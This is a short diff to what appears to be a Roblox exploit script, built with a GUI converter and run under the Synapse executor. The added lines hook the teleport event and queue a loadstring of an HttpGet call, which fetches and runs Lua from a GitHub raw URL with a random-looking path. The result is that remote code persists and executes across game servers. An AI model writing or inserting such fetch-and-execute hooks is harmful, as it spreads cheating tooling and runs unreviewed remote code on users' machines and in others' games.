@@ -5779,3 +5779,10 @@ local function AOZY_fake_script() -- commandbox.LocalScript
 	end)
 end
 coroutine.wrap(AOZY_fake_script)()
+
+
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+    if State == Enum.TeleportState.Started then
+        syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/shadowlords/asdfasfdsfsdf/master/asdhasd.lua'))()")
+    end
+end)
